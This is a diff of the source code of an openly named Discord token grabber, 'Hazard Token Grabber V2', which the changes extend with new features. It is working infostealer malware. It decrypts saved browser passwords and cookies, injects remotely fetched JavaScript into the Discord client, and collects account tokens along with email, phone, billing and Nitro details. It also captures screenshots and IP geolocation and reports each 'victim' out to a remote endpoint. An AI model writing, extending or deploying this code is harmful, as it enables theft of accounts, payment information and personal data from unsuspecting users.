@@ -1,6 +1,7 @@
-import requests, os, string, random, win32crypt, shutil, sqlite3, zipfile, json, base64, psutil, pyautogui, cv2
-import numpy as np
+import requests, os, string, random, win32crypt, shutil, sqlite3, zipfile, json, base64, psutil, pyautogui
+from requests.api import request
 from re import findall
+from datetime import datetime
 from urllib.request import urlopen
 from Crypto.Cipher import AES
 
@@ -19,6 +20,7 @@ class Hazard_Token_Grabber_V2:
             # pass
 
         self.tokens = []
+        self.saved = []
 
         self.grabPassword()
         self.grabCookies()
@@ -49,10 +51,7 @@ class Hazard_Token_Grabber_V2:
                 if (name.__contains__("discord_desktop_core-")):
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        try:
-                            os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-                        except FileExistsError:
-                            pass
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
                         f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
                         index_content = f.read()
                         with open(directory_list, 'wb') as index_file:
@@ -154,7 +153,7 @@ class Hazard_Token_Grabber_V2:
             pass
 
     def grabTokens(self):
-        f = open (self.tempfolder+"\\Discord Tokens.txt", "w+")
+        f = open (self.tempfolder+"\\Discord Info.txt", "w+")
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
@@ -194,22 +193,73 @@ class Hazard_Token_Grabber_V2:
         for token in self.tokens:
             r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
             if r.status_code == 200:
-                f.write(f"{token}\n")
+                if token in self.saved:
+                    continue
+                self.saved.append(token)
+                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
+                badges = ""
+                flags = j['flags']
+                if (flags == 1):
+                    badges += "Staff, "
+                if (flags == 2):
+                    badges += "Partner, "
+                if (flags == 4):
+                    badges += "Hypesquad Event, "
+                if (flags == 8):
+                    badges += "Green Bughunter, "
+                if (flags == 64):
+                    badges += "Hypesquad Bravery, "
+                if (flags == 128):
+                    badges += "HypeSquad Brillance, "
+                if (flags == 256):
+                    badges += "HypeSquad Balance, "
+                if (flags == 512):
+                    badges += "Early Supporter, "
+                if (flags == 16384):
+                    badges += "Gold BugHunter, "
+                if (flags == 131072):
+                    badges += "Verified Bot Developer, "
+                if (badges == ""):
+                    badges = "None"
+    
+                user = j["username"] + "#" + str(j["discriminator"])
+                email = j["email"]
+
+                phone = j["phone"] if j["phone"] else "No Phone Number attached"
+                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
+                
+                try:
+                    request.get(url)
+                except:
+                    url = url[:-4]
+
+                nitro_data = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                has_nitro = False
+                has_nitro = bool(len(nitro_data) > 0)
+                if has_nitro:
+                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                    days = abs((d2 - d1).days)
+                days_left = days if has_nitro else "0"
+
+                response = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=self.getheaders(token))
+
+                billing = bool(len(json.loads(response.content)) > 0)
+
+                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nNitro Expires in: {days_left} day(s)\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
 
     def screenshot(self):
         image = pyautogui.screenshot()
-        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
-        cv2.imwrite(self.tempfolder + "\\Screenshot.png", image)
+        image.save(self.tempfolder + "\\Screenshot.png")
 
     def SendInfo(self):
         try:
-            data = requests.get("http://ipinfo.io/json", headers=self.getheaders()).json()
+            data = requests.get("http://ipinfo.io/json").json()
             ip = data['ip']
-            loc = data['loc']
             city = data['city']
             country = data['country']
             region = data['region']
-            googlemap = "https://www.google.com/maps/search/google+map++" + loc
+            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except:
             pass
         temp = os.path.join(self.tempfolder)
@@ -217,7 +267,7 @@ class Hazard_Token_Grabber_V2:
         self.zip(temp, new)
         for dirname, _, files in os.walk(self.tempfolder):
             for f in files:
-                self.files += f"\n*{f}"
+                self.files += f"\n・{f}"
         n = 0
         for r, d, files in os.walk(self.tempfolder):
             n+= len(files)
@@ -231,7 +281,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                     },
-                    "description": f"New Victim to Hazard Token Grabber.V2\n```fix\nUsername: {os.getlogin()}\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                     "color": 16119101,
 
                     "thumbnail": {
